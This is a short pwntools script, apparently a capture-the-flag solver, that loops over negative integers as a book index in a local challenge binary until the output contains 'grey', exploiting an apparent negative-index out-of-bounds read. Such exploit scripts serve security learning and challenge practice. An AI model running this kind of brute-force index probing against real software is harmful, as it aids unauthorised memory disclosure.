from pwn import *
context.binary=exe=ELF('./chall',checksec=False)
p=process(exe.path)

def read(book):
	p.sendlineafter(b"Option: ",b"1")
	p.sendlineafter(b"> ",str(book).encode())

for i in range(-2147483648,0,+1):
	p=process(exe.path)
	read(i)
	a=p.recvall(timeout=1)
	if(b"grey" in a):
		print(a)
		print(i)
		break
